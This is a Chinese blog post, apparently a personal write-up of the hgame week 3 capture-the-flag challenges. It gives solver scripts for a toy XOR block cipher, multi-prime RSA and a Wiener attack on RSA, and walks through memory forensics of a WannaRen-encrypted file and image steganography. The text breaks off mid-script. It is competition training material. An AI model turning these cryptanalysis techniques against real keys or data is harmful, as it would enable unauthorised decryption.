@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言第三周题量不多，还是没摆烂摆下去。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【hgame week3】write up">
+<meta property="og:url" content="http://example.com/2022/02/11/%E3%80%90hgame-week3%E3%80%91write-up/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言第三周题量不多，还是没摆烂摆下去。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/EB7CrXFuHplq9Qd.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/XEnUgHLNi9ymZ5u.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/Ta1X53rPqWhoElJ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/uNrB1QsWhqGmMCP.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/knoxj6zipsFt1rG.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/EpWPcDlTSNGaCxm.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/3SUZ4spHt1TRq6Q.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/rbkFnys8hwzdPm2.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/48GvskhALyw5rVd.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/kKRtJ16CScz8ZbX.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/R7Ltlgo3N5xXk8z.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/09/IFBsH4Cte93Gkbg.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/09/LCuTUe5BP1qfZmJ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/09/rJSWimoa53fPQX6.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/11/MzSNCW1GdsqFfAu.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/11/aLlEgMrj7qWOpfm.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/11/VGbYtizx25WnEyO.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/11/7ptnGlA8wBr2Nax.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/Ipf7aXs5xwNyFqb.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/kz9U3dscpPbEnZH.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/iOICYQ7lqcEaGez.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/trXYx7NvPQk13ub.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/o9T7j8WJrnehtbk.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/MIgQniEf2aNJWK7.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/ILkbUXENfliGwxY.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/9J3AicKGvVSLE58.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/7hOTQpl3s2XYIRM.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/HeA3RyQ2swMmTpj.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/06/GIoFzES2k4p6PTi.png">
+<meta property="article:published_time" content="2022-02-11T13:27:12.000Z">
+<meta property="article:modified_time" content="2022-02-11T13:27:57.177Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/02/06/EB7CrXFuHplq9Qd.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/02/11/【hgame-week3】write-up/"/>
+
+
+
+
+
+  <title>【hgame week3】write up | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/11/%E3%80%90hgame-week3%E3%80%91write-up/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【hgame week3】write up</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-02-11T21:27:12+08:00">
+                2022-02-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-up/" itemprop="url" rel="index">
+                    <span itemprop="name">write up</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第三周题量不多，还是没摆烂摆下去。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Block-Cipher"><a href="#Block-Cipher" class="headerlink" title="Block Cipher"></a>Block Cipher</h2><p>考点在于字节流转换以及分组加密:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import operator</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line">from functools import reduce</span><br><span class="line">from secret import flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pad(s):</span><br><span class="line">    padding_length = (8 - len(s)) % 8</span><br><span class="line">    return s + chr(padding_length) * padding_length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def xor(a, b):</span><br><span class="line">    assert len(a) == len(b)</span><br><span class="line">    return bytes(map(operator.xor, a, b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(s):</span><br><span class="line">    iv = bytes(random.randint(0, 255) for _ in range(8))</span><br><span class="line">    key = bytes(random.randint(0, 255) for _ in range(8))</span><br><span class="line">    parts = list(map(str.encode, map(pad, re.findall(r&#x27;.&#123;1,8&#125;&#x27;, s))))</span><br><span class="line">    results = []</span><br><span class="line">    for index, part in enumerate(parts):</span><br><span class="line">        results.append(reduce(xor, [part, iv if index == 0 else results[-1], key]))</span><br><span class="line">    return iv, key, results</span><br><span class="line"></span><br><span class="line">iv, key, parts = encrypt(flag)</span><br><span class="line">print(f&quot;iv = &#123;iv&#125;&quot;)</span><br><span class="line">print(f&quot;key = &#123;key&#125;&quot;)</span><br><span class="line">print(f&quot;parts = &#123;parts&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>加密逻辑就是将flag分成8位1part，然后第一位和iv和key异或，第二位和key以及第一次异或结果，以此类推。因此我们只需要将字节流转换回整形进行反向异或即可。编写脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">iv = b&#x27;Up\x14\x98r\x14%\xb9&#x27;</span><br><span class="line">key = b&#x27;\r\xe8\xb86\x9c33^&#x27;</span><br><span class="line">parts = [b&#x27;0\xff\xcd\xc3\x8b\\T\x8b&#x27;, b&#x27;RT\x1e\x89t&amp;\x17\xbd&#x27;, b&#x27;\x1a\xee\x8d\xd6\x9b&gt;w\x8c&#x27;, b&#x27;9CT\xb3^pF\xd0&#x27;]</span><br><span class="line"></span><br><span class="line">a = int.from_bytes(iv, byteorder=&#x27;big&#x27;)</span><br><span class="line">b = int.from_bytes(key, byteorder=&#x27;big&#x27;)</span><br><span class="line">c = []</span><br><span class="line">for i in parts:</span><br><span class="line">    c.append(int.from_bytes(i, byteorder=&#x27;big&#x27;))</span><br><span class="line"></span><br><span class="line">for j in range(0,3):</span><br><span class="line">    flag = c[3-j]^c[2-j]^b</span><br><span class="line">    print(hex(flag))</span><br><span class="line">d = c[0]^a^b</span><br><span class="line">print(hex(d))</span><br></pre></td></tr></table></figure>
+
+<p>将四次输出结果放过来解码十六进制即可得到flag：<br><img src="https://s2.loli.net/2022/02/06/EB7CrXFuHplq9Qd.png"><br><img src="https://s2.loli.net/2022/02/06/XEnUgHLNi9ymZ5u.png"></p>
+<h2 id="Multi-Prime-RSA"><a href="#Multi-Prime-RSA" class="headerlink" title="Multi Prime RSA"></a>Multi Prime RSA</h2><p>RSA的多素数加密，上加密脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import getPrime</span><br><span class="line">from gmpy2 import invert</span><br><span class="line">from libnum import s2n</span><br><span class="line"></span><br><span class="line">from secret import flag, get_phi</span><br><span class="line"></span><br><span class="line">p = getPrime(256)</span><br><span class="line">q = getPrime(256)</span><br><span class="line">r = getPrime(256)</span><br><span class="line">s = getPrime(256)</span><br><span class="line">n = p ** 2 * q ** 3 * r ** 5 * s ** 7</span><br><span class="line">phi = get_phi(p, q, r, s)</span><br><span class="line">e = 65537</span><br><span class="line">c = pow(s2n(flag), e, n)</span><br><span class="line">print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">print(f&quot;q = &#123;q&#125;&quot;)</span><br><span class="line">print(f&quot;r = &#123;r&#125;&quot;)</span><br><span class="line">print(f&quot;s = &#123;s&#125;&quot;)</span><br><span class="line">print(f&quot;n = &#123;n&#125;&quot;)</span><br><span class="line">print(f&quot;e = &#123;e&#125;&quot;)</span><br><span class="line">print(f&quot;c = &#123;c&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>这里要运用到欧拉函数的计算方法：<br><img src="https://s2.loli.net/2022/02/06/Ta1X53rPqWhoElJ.png"></p>
+<p>根据上面的方法直接写脚本解RSA：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">p = 109056753224725357860050862987465749131702509174531265860789564184166504627089</span><br><span class="line">q = 64871884070495743485110397060920534297122908609816622599229579748089451488127</span><br><span class="line">r = 73817195552029165561107245309535744382442021553254903166961729774806232509583</span><br><span class="line">s = 89907870347457693114161779597928900080173728317019344960807644151097370118553</span><br><span class="line">n = 337945247991531188630780631650822497552908401425959508214145019590891175999570651678385514599227649321033438265588883204645721459926338248032512615537333971869461679586403649697114789385472197685140603238299768873935137939123021910982793481655218061907401584383081422244812725080939394854989735528833013780919908024635812696998644603525843637686545709789908672408993923182946718279531020289767042649725545073526307769817097790005360720650079676982379162926484355121626302801800589993422729725583400678081766553017405965706770238634252836827793877622715474210575752508172785712202444441372140501379422725172250199713113954442223362073485143579617841236442644760494913432967541691532709842303408702693199269606594116690052170245340072114122287646793344327315326489574192325790848798131621842606487734721409882742631176999703502149639410263361145441889337623403361569958342141903891414217371443118527025041591219747780100510414268546884029077010164415049298406632069845430841542680166802473749172801804659277821899576403669845353379213803866969800665351300325701817179936198902427032684058452719607840314873315299975603264092020097224735237221994922702705781103002327285724125001893421030923788361576161461965707958695720464547129911053732747399113017747456439027947305796290572816318795181398935020951025833913</span><br><span class="line">e = 65537</span><br><span class="line">c = 281020926647419736778465777714512241989738235339105762863874725870511725155101862585192241287617168165290485944476735304459717602798728005687755713662466866091315959960168862035396245078850168822145228676116894754613436735897122137945552880864031115366493898382809812977280234389519365119627504653135151731589924405933589175425427189436855517194951589952822691774400942764910734054237756669945324833759799471068481769516338068810710333940167779043544371586185132920304774984746129764220081092726473696111126293966890901487735046101991609292612206984184161394385767762455321150541601949740631911175736268756408775307673610842645555513631617648877296855194327486811545670357137463942744122553468603244298691801028147147418563982169678640270746871085722092365159546820433098926679284504740402248142173715649451061037156261913601096905601577932894877435316535261789072594174871292814951406337447799051502635390866434813419165738873787323716033378045850292413169255965421404580559241351577058726176436504950558398769061998430771982995850759810867299728407860522399699076192754977454139708618158667289120827143703464056583125568576691058753072898162981956883451252542611323974071518397220203389962420073122776649094369816178685947397943358134020598211306649724455966463885765977564934172273334309312046278116760547</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">phi = (p**2-p)* (q**3-q**2) * (r**5-r**4) * (s**7-s**6)</span><br><span class="line">d = libnum.invmod(e,phi)</span><br><span class="line">flag = libnum.n2s(pow(c,d,n))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>解得flag：<br><img src="https://s2.loli.net/2022/02/06/uNrB1QsWhqGmMCP.png"></p>
+<h2 id="RSA-Attack-3"><a href="#RSA-Attack-3" class="headerlink" title="RSA Attack 3"></a>RSA Attack 3</h2><p>这题要利用到RSA中的<code>wiener-attack</code>，特征是e的值非常大，这就导致了d的值会比较小，因此可以利用相关工具破解。这里从网上码了一个完整的脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">def continuedFra(x, y):</span><br><span class="line">    cf = []</span><br><span class="line">    while y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    return cf</span><br><span class="line">def gradualFra(cf):</span><br><span class="line">    numerator = 0</span><br><span class="line">    denominator = 1</span><br><span class="line">    for x in cf[::-1]:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    return numerator, denominator</span><br><span class="line">def solve_pq(a, b, c):</span><br><span class="line">    par = gmpy2.isqrt(b * b - 4 * a * c)</span><br><span class="line">    return (-b + par) // (2 * a), (-b - par) // (2 * a)</span><br><span class="line">def getGradualFra(cf):</span><br><span class="line">    gf = []</span><br><span class="line">    for i in range(1, len(cf) + 1):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    return gf</span><br><span class="line"></span><br><span class="line">def wienerAttack(e, n):</span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    for d, k in gf:</span><br><span class="line">        if k == 0: continue</span><br><span class="line">        if (e * d - 1) % k != 0:</span><br><span class="line">            continue</span><br><span class="line">        phi = (e * d - 1) // k</span><br><span class="line">        p, q = solve_pq(1, n - phi + 1, n)</span><br><span class="line">        if p * q == n:</span><br><span class="line">            return d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n= 507419170088344932990702256911694788408493968749527614421614568612944144764889717229444020813658893362983714454159980719026366361318789415279417172858536381938870379267670180128174798344744371725609827872339512302232610590888649555446972990419313445687852636305518801236132032618350847705234643521557851434711389664130274468354405273873218264222293858509477860634889001898462547712800153111774564939279190835857445378261920532206352364005840238252284065587291779196975457288580812526597185332036342330147250312262816994625317482869849388424397437470502449815132000588425028055964432298176942124697105509057090546600330760364385753313923003549670107599757996810939165300581847068233156887269181096893089415302163770884312255957584660964506028002922164767453287973102961910781312351686488047510932997937700597992705557881172640175117476017503918294534205898046483981707558521558992058512940087192655700351675718815723840568640509355338482631416345193176708501897458649841539192993142790402734898948352382350766125000186026261167277014748183012844440603384989647664190074853086693408529737767147592432979469020671772152652865219092597717869942730499507426269170189547020660681363276871874469322437194397171763927907099922324375991793759</span><br><span class="line">e= 77310199867448677782081572109343472783781135641712597643597122591443011229091533516758925238949755491395489408922437493670252550920826641442189683907973926843505436730014899918587477913032286153545247063493885982941194996251799882984145155733050069564485120660716110828110738784644223519725613280140006783618393995138076030616463398284819550627612102010214315235269945251741407899692274978642663650687157736417831290404871181902463904311095448368498432147292938825418930527188720696497596867575843476810225152659244529481480993843168383016583068747733118703000287423374094051895724494193455175131120243097065270804457787026492578916584536863548445813916819417857064037664101684455000184987531252344582899589746272173970083733130106407810619258077266603898529285634495710846838011858287024329514491058790557305041389614650730267774482954666726949886313386881066593946789460028399523245777171320319444673551268379126203862576627540177888290265714418064334752499940587750374552330008143708562065940245637685833371348603338834447212248648869514585047871442060412622164276894766238383894693759347590977926306581080390685360615407766600573527565016914830132066428454738135380178959590692145577418811677639050929791996313180297924833690095</span><br><span class="line">c= 165251729917394529793163344300848992394021337429474789711805041655116845722480301677817165053253655027459227404782607373107477419083333844871948673626672704233977397989843349633720167495862807995411682262559392496273163155214888276398332204954185252030616473235814999366132031184631541209554169938146205402400412307638567132128690379079483633171535375278689326189057930259534983374296873110199636558962144635514392282351103900375366360933088605794654279480277782805401749872568584335215630740265944133347038070337891035560658434763924576508969938866566235926587685108811154229747423410476421860059769485356567301897413767088823807510568561254627099309752215808220067495561412081320541540679503218232020279947159175547517811501280846596226165148013762293861131544331444165070186672186027410082671602892508739473724143698396105392623164025712124329254933353509384748403154342322725203183050328143736631333990445537119855865348221215277608372952942702104088940952142851523651639574409075484106857403651453121036577767672430612728022444370874223001778580387635197325043524719396707713385963432915855227152371800527536048555551237729690663544828830627192867570345853910196397851763591543484023134551876591248557980182981967782409054277224</span><br><span class="line"></span><br><span class="line">d=wienerAttack(e, n)</span><br><span class="line">m=pow(c, d, n)</span><br><span class="line">print(libnum.n2s(m).decode())</span><br></pre></td></tr></table></figure>
+
+<p>得出flag：<br><img src="https://s2.loli.net/2022/02/06/knoxj6zipsFt1rG.png"></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="卡中毒"><a href="#卡中毒" class="headerlink" title="卡中毒"></a>卡中毒</h2><p>内存取证，这次也是第一次上手，工具装了蛮久的，有点麻，但是题目本身不难。</p>
+<p>首先基本操作，查看系统信息：<br><img src="https://s2.loli.net/2022/02/06/EpWPcDlTSNGaCxm.png"></p>
+<p>看出操作系统是win7sp1x64，接着根据提示内容，查看ie浏览记录：<br><img src="https://s2.loli.net/2022/02/06/3SUZ4spHt1TRq6Q.png"></p>
+<p>发现flag文件，格式为7z，搜索文件位置：<br><img src="https://s2.loli.net/2022/02/06/rbkFnys8hwzdPm2.png"></p>
+<p>根据文件位置获取文件：<br><img src="https://s2.loli.net/2022/02/06/48GvskhALyw5rVd.png"></p>
+<p>打开后发现一个WannaRen病毒加密的txt文件：<br><img src="https://s2.loli.net/2022/02/06/kKRtJ16CScz8ZbX.png"></p>
+<p>利用火绒WannaRen解密工具进行解密后，发现txt文件中是一串新与佛论禅密码，解码即可得到flag：<br><img src="https://s2.loli.net/2022/02/06/R7Ltlgo3N5xXk8z.png"></p>
+<h2 id="谁不喜欢猫猫呢"><a href="#谁不喜欢猫猫呢" class="headerlink" title="谁不喜欢猫猫呢"></a>谁不喜欢猫猫呢</h2><p>附件是一张甘城猫猫的新图，爱了爱了。010翻到最后发现藏有压缩包，直接改后缀提取两个txt文件：<br><img src="https://s2.loli.net/2022/02/09/IFBsH4Cte93Gkbg.png"></p>
+<p>发现是两个txt文件中都是9个数字，这里尝试把两个文档中位置对应的数字加起来转换成2进制发现可以得出flag头，因此进行转换：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">list1 = [776686, 749573, 6395443, 2522866, 279584, 587965, 4012670, 1645156, 2184634]</span><br><span class="line">list2 = [6065523, 6419830, 1421837, 5103682, 5963053, 2842996, 1113825, 1594064, 4578755]</span><br><span class="line"></span><br><span class="line">for i in range(0,9):</span><br><span class="line">    result = list1[i]+list2[i]</span><br><span class="line">    print(&#x27;&#123;:024b&#125;&#x27;.format(result))</span><br></pre></td></tr></table></figure>
+
+<p>结果：<br><img src="https://s2.loli.net/2022/02/09/LCuTUe5BP1qfZmJ.png"></p>
+<p>做一次二进制转字符串得到flag：<br><img src="https://s2.loli.net/2022/02/09/rJSWimoa53fPQX6.png"></p>
+<p>这里做下赛后补充，上述做法是直接尝试出来的，但是预期解法中会直接提示你要做加法运算。</p>
+<p>首先发现图上有异常像素，用python脚本进行提取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">x, y = 0, 0</span><br><span class="line">a = Image.open(&quot;cat.png&quot;)</span><br><span class="line">flag = Image.new(&quot;RGB&quot;, (214, 214))</span><br><span class="line">for w in range(4, a.size[0] -10 , 11):</span><br><span class="line">    for h in range(4, a.size[1]-10 , 11):</span><br><span class="line">        r, g, b, _ = a.getpixel((w + 1, h + 1))</span><br><span class="line">        rgba = flag.putpixel((x, y), (r, g, b))</span><br><span class="line">        y += 1</span><br><span class="line">    x += 1</span><br><span class="line">    y = 0</span><br><span class="line">flag.save(&quot;data.png&quot;)</span><br></pre></td></tr></table></figure>
+<p>得到图1：<br><img src="https://s2.loli.net/2022/02/11/MzSNCW1GdsqFfAu.png"></p>
+<p>观察发现每个带颜色的点都间隔4像素点，由此编出脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">img = Image.open(&#x27;26.png&#x27;)</span><br><span class="line">width, height = img.size</span><br><span class="line">pixs_list = []</span><br><span class="line">for w in range(2, width, 5):</span><br><span class="line">	for h in range(2, height, 5):</span><br><span class="line">		pix = img.getpixel((w, h))</span><br><span class="line">		pixs_list.append(pix)</span><br><span class="line">new_width, new_height = 43, 43</span><br><span class="line">new_img = Image.new(&#x27;RGB&#x27;, (new_width, 